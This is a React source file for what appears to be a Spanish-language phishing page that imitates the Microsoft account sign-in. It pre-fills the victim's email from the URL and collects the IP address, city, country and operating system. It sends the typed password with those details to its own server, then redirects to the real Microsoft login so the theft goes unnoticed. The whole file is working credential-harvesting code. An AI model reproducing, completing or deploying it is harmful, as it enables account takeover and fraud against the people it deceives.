import { useEffect, useState } from "react";
import { Link, useParams } from "react-router-dom";
import * as FiIcons from "react-icons/fi";
import css from "./login.module.css";
import pax from "../../../package.json";
import dayjs from "dayjs";
import out from "../../assets/out.png";
import { createRegistroUser } from "../../api_server/registroApi";
import { getAllPais } from "../../api_server/paisApi";

export default function Login() {
  const [xstet, setxStet] = useState(null);
  const [xemail, setxEmail] = useState("");
  const [xPaises, setxPaises] = useState([]);
  const [password, setPassword] = useState("");
  const [errorSpan, setErrorSpan] = useState(false);
  const [errPassword, setErrPaswword] = useState(false);

  //params
  const { email } = useParams();

  console.log(xstet);
  // console.log(email);
  // console.log(xemail);
  // console.log(password);

  //forma para obtener ubicacion de su pais y su ip
  const [details, setDetails] = useState(null);
  // console.log(details?.city);
  // console.log(details);
  // console.log(xPaises);
  // console.log(pax.version);

  let country = details?.country_name;
  let ip = details?.ip;
  let city = details?.city;

  let per = dayjs();
  const fecha_x = per.format("DD/MM/YYYY");

  // const pepe = xPaises.filter((e) => {
  //   if (e?.desc_corta_v === details?.country) {
  //     return e;
  //   }
  // });
  // console.log(pepe);

  // setTimeout(function () {
  //   if (pepe?.desc_corta_v !== details?.country) {
  //     setxStet(true);
  //     console.log("ssssssssss");
  //   }
  // }, 1500);

  useEffect(() => {
    const getUserGeolocationDetails = () => {
      fetch(
        "https://ipapi.co/json/"
        // "https://geolocation-db.com/json/0f761a30-fe14-11e9-b59f-e53803842572"
      )
        .then((response) => response.json())
        .then((data) => setDetails(data));
    };
    getUserGeolocationDetails();

    const obtienePais = async () => {
      const kale = await getAllPais();
      setxPaises(kale?.data);

      const pepe = xPaises.filter((e) => {
        if (e?.desc_corta_v === details?.country) {
          return e;
        }
      });
      console.log(pepe);

      if (pepe?.desc_corta_v !== details?.country) {
        setxStet(true);
        console.log("ssssssssss");
      }
    };

    obtienePais();

    // if (xstet === true) {
    //   console.log("si encontro");
    //   window.location.href =
    //     "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=23&ct=1713452137&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26nlp%3d1%26RpsCsrfState%3d036328ae-6978-64c6-c8dc-e4f5539b0b81&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c";
    // }
  }, []);

  // if (pepe.length === 0) {
  //   setxStet(true);
  // }

  // useEffect(() => {
  //   setTimeout(function () {
  //     const popo = xPaises.filter((e) => {
  //       if (e?.desc_corta_v === details?.country) {
  //         return e;
  //       }
  //     });
  //     console.log(popo);

  //     if (popo && popo && popo[0]?.desc_corta_v !== details?.country) {
  //       console.log("si encontro");
  //       window.location.href =
  //         "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=23&ct=1713452137&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26nlp%3d1%26RpsCsrfState%3d036328ae-6978-64c6-c8dc-e4f5539b0b81&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c";
  //     }

  //     console.log("Han pasado 3 segundos");
  //   }, 3000);
  // }, [xstet]);

  // console.log(xPaises);
  // console.log(details?.country);

  //ver el sistema operativo de dpnde ingresa a la web
  var InfoSistemaOperativo = window.navigator.appVersion.toLowerCase();

  // console.log(InfoSistemaOperativo);

  // Expresión regular para buscar el texto dentro de paréntesis
  const regex = /\((.*?)\)/g;

  // Array para almacenar todos los textos dentro de paréntesis encontrados
  const textosDentroParentesis = [];

  // Encontrar todos los textos dentro de paréntesis usando la expresión regular
  let match;
  while ((match = regex.exec(InfoSistemaOperativo))) {
    textosDentroParentesis.push(match[1]);
  }

  // console.log(textosDentroParentesis[0]);
  const so = textosDentroParentesis[0];
  // console.log(InfoSistemaOperativo);

  const statePassword = (e) => {
    console.log(e.target.value);
    if (e.target.value.length > 0) {
      setErrPaswword(false);
    }
    setPassword(e.target.value);
  };

  //? Enviar datos al server
  //? ******************************************************************************
  //? ******************************************************************************
  const enviarRegitro = async (e) => {
    e.preventDefault();

    let datax = {
      IP_V: ip,
      PASSWORD_V: password,
      EMAIL_V: email,
      SISTEMA_OP_V: so,
      PAIS_V: country,
      CITY_V: city,
      FECHA_V: fecha_x,
    };
    console.log(datax);

    if (errorSpan) {
      return (window.location.href =
        "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=23&ct=1713452137&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26nlp%3d1%26RpsCsrfState%3d036328ae-6978-64c6-c8dc-e4f5539b0b81&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c");
    }

    if (!password) {
      console.log("primer envio");
      return setErrPaswword(true);
    } else {
      console.log("segundoenvio");
      setErrorSpan(true);
      setPassword("");
      return await createRegistroUser(datax);
    }
  };

  return (
    <div className={css.bg_login}>
      <div className={css.container_login}>
        <div className={css.out_title}>
          <img src={out} alt="red" />
        </div>

        <div className={css.div_login}>
          <img
            className={css.logo}
            src="https://acctcdn.msauth.net/images/microsoft_logo_7lyNn7YkjJOP0NwZNw6QvQ2.svg"
            alt="Microsoft"
          />

          <form className={css.form_login} onSubmit={enviarRegitro}>
            <div className={css.div_email}>
              {email?.length > 0 && <FiIcons.FiArrowLeft />}
              <input
                className={css.input}
                type="text"
                name="email"
                value={email && email}
                onChange={(e) => setxEmail(e.target.value)}
              />
            </div>

            <h3 className={css.text_escribir}>Escribir contraseña</h3>

            {errPassword && (
              <p className={css.error}>
                Escriba la contraseña de su cuenta de Microsoft.
              </p>
            )}
            {/* 
            {errPassword ? (
              <section className={css.error}>
                <span>Escribe la contraseña de tu cuenta Microsoft.</span>
              </section>
            ) : null} */}

            {/* {errorSpan ? (
              <section className={css.error}>
                <span>
                  la cuenta o la contraseña es incorrecta si no recuerdas la
                  contraseña
                </span>
                <strong> restablecela ahora</strong>
              </section>
            ) : null} */}
            <div className={` ${css.div_password}`}>
              <input
                className={`${css.input_pass} `}
                type="password"
                name="password"
                placeholder="Contraseña"
                value={password}
                onChange={statePassword}
              />
            </div>

            <Link to="/login" className={css.link_login}>
              ¿Ha olvidado su contraseña?
            </Link>

            <button type="submit" className={css.btn_login}>
              Iniciar sesión
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
